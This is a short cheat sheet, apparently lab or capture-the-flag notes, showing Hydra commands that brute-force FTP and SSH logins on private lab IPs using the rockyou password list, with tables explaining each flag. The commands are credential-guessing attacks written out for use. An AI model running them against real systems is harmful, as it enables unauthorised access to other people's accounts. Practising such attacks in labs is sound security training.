
### Bruteforce ftp with Hydra
```bash
hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp
```

| SECTION               | FUNCTION                                               |
|-----------------------|--------------------------------------------------------|
| hydra                 | Runs the hydra tool                                    |
| -t 4                  | Number of parallel connections per target              |
| -l [user]             | Points to the user who's account you're trying to compromise  |
| -P [path to dictionary]| Points to the file containing the list of possible passwords |
| -vV                   | Sets verbose mode to very verbose, shows the login+pass combination for each attempt |
| [machine IP]          | The IP address of the target machine                   |
| ftp / protocol        | Sets the protocol                                      |


### Bruteforce ssh with Hydra
``` bash
hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.188.119 ssh
```

Let's break it down:

|   |   |
|---|---|
|**SECTION**|**FUNCTION**|
|hydra|Runs the hydra tool|
|-t 16|Number of parallel connections per target|
|-l [user]|Points to the user who's account you're trying to compromise|
|-P [path to dictionary]|Points to the file containing the list of possible passwords|
|-vV|Sets verbose mode to very verbose, shows the login+pass combination for each attempt|
|[machine IP]|The IP address of the target machine|
|ssh / protocol|Sets the protoco|

